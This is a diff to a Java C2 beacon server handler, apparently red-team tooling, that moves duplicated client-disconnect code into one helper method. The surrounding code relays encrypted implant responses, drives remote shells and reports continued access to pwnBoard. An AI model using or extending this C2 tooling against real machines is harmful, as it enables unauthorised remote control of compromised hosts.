@@ -63,7 +63,6 @@ public class BeaconClientHandler implements Runnable{
      * @param os Operating System of this client
      */
     protected BeaconClientHandler(String IPAddress, Duplexer duplexer, BeaconServer beaconServer, String os, Object shellLock, aes aes){
-        //this.rot13 = new rot13();
         this.IPAddress = IPAddress;
         this.duplexer = duplexer;
         this.beaconServer = beaconServer;
@@ -113,6 +112,29 @@ public class BeaconClientHandler implements Runnable{
         }
     }
 
+    /**
+     * Function used to handle anything that needs to happen when a client disconnects
+     * Sends a message in the Beacon Server Terminal, Sends a message to the C2 Server, 
+     * Adds a mesasge at the end of the response dictionary, and closes all of the
+     * threads associated with this client. 
+     * @param e - Error message stack trace to be printed. If no stack trace should be printed, e should be null
+     */
+    private void clientDisconnect(Exception e){
+        sentinel = false;
+        try{
+            duplexer.close();
+            keepAliveClass.stopKeepAlive();
+        } catch (IOException d){
+            d.printStackTrace();
+        }
+        beaconServer.sendDataToC2Server("Lost " + os + " Client at " + IPAddress);
+        beaconServer.addDataToResponsesDictionaries(IPAddress, "DISCONNECTED");
+        System.out.println(IPAddress + " disconnected");
+        if(e != null){
+            e.printStackTrace();
+        }
+    }
+
     @Override
     public void run(){
         // Start the Thread to Send KEEP_ALIVE messages to the client every 30 seconds
@@ -122,119 +144,49 @@ public class BeaconClientHandler implements Runnable{
         Thread pwnBoardRequestThread = new Thread(pwnBoardRequestObject);
         pwnBoardRequestThread.start();
 
-        Boolean notify;
-        int pwnBoardCounter = 0;
         String encrypted = "";
         String response = "";
         while(sentinel){ 
             try{
-                notify = false;
                 try{
                     encrypted = duplexer.receive(true);
                 } catch (java.lang.NumberFormatException e){
-                    sentinel = false;
-                    try{
-                        duplexer.close();
-                        keepAliveClass.stopKeepAlive();
-                    } catch (IOException d){
-                        d.printStackTrace();
-                    }
-                    beaconServer.sendDataToC2Server("Lost " + os + " Client at " + IPAddress);
-                    beaconServer.addDataToResponsesDictionaries(IPAddress, "DISCONNECTED");
-                    System.out.println(IPAddress + " disconnected");
+                    clientDisconnect(e);
                 }
                 
                 response = aes.decrypt(encrypted);
 
+                // When the linux client disconnects, for some reason is just sends a lot of null messages over and over
                 if(response == null){
-                    sentinel = false;
-                    try{
-                        duplexer.close();
-                        keepAliveClass.stopKeepAlive();
-                    } catch (IOException d){
-                        d.printStackTrace();
-                    }
-                    beaconServer.sendDataToC2Server("Lost " + os + " Client at " + IPAddress);
-                    beaconServer.addDataToResponsesDictionaries(IPAddress, "DISCONNECTED");
-                    System.out.println(IPAddress + " disconnected");
+                    clientDisconnect(null);
                 }
 
-                // When the linux clients disconnect, they don't actually stop, they just repeatedly send null over and over
-                if(response == null){
-                    sentinel = false;
-                    try{
-                        duplexer.close();
-                        keepAliveClass.stopKeepAlive();
-                    } catch (IOException d){
-                        d.printStackTrace();
-                    }
-                    beaconServer.sendDataToC2Server("Lost " + os + " Client at " + IPAddress);
-                    beaconServer.addDataToResponsesDictionaries(IPAddress, "DISCONNECTED");
-                }
-
-                // Every time a response is received, notify the pwnBoard lock, so that the thread will send a message to pwnBoard
-                // that we have an active connection with the agent.
-                pwnBoardCounter++;
-                if(pwnBoardCounter % 15 == 0){
-                    synchronized(pwnBoardLock){
-                        pwnBoardLock.notify();
-                    }
+                // Every time we receive a message from our client, we want to notify pwnboard that we still have access to this machine
+                synchronized(pwnBoardLock){
+                    pwnBoardLock.notify();
                 }
 
 
-                if(response != null){
-                    if(!(response.equals("KEEP_ALIVE"))){
-                        // Remove the END_OF_OUTPUT part of the end of the response to the command
-                        if(response.contains(("END_OF_OUTPUT"))){
-                            response = response.substring(0, response.indexOf("END_OF_OUTPUT"));
-                            notify = true;
-                        }
-                        beaconServer.addDataToResponsesDictionaries(IPAddress, response);
+                
+                if(!(response.equals("KEEP_ALIVE"))){
+                    beaconServer.addDataToResponsesDictionaries(IPAddress, response);
 
-                        // If this client is currently being used as a shell, notify the lock so that the server knows
-                        // to return the responses immediately
-                        if(isShell && notify){
-                            synchronized(shellLock){
-                                shellLock.notify();
-                            }
+                    // If this client is currently being used as a shell, notify the lock so that the server knows
+                    // to return the responses immediately
+                    if(isShell){
+                        synchronized(shellLock){
+                            shellLock.notify();
                         }
                     }
                 }
             } catch(java.net.SocketException e){
-                sentinel = false;
-                try{
-                    duplexer.close();
-                    keepAliveClass.stopKeepAlive();
-                } catch (IOException d){
-                    d.printStackTrace();
-                }
-                beaconServer.sendDataToC2Server("Lost " + os + " Client at " + IPAddress);
-                beaconServer.addDataToResponsesDictionaries(IPAddress, "DISCONNECTED");
-                System.out.println(IPAddress + " disconnected");
+                clientDisconnect(e);
             } 
             
             catch (IOException e){
-                sentinel = false;
-                try{
-                    duplexer.close();
-                    keepAliveClass.stopKeepAlive();
-                } catch (IOException d){
-                    d.printStackTrace();
-                }
-                beaconServer.sendDataToC2Server("Lost " + os + " Client at " + IPAddress);
-                beaconServer.addDataToResponsesDictionaries(IPAddress, "DISCONNECTED");
-                e.printStackTrace();
+                clientDisconnect(e);
             } catch (java.lang.NullPointerException e){
-                sentinel = false;
-                try{
-                    duplexer.close();
-                    keepAliveClass.stopKeepAlive();
-                } catch (IOException d){
-                    d.printStackTrace();
-                }
-                beaconServer.sendDataToC2Server("Lost " + os + " Client at " + IPAddress);
-                beaconServer.addDataToResponsesDictionaries(IPAddress, "DISCONNECTED");
-                e.printStackTrace();
+                clientDisconnect(e);
             }
         }
     }
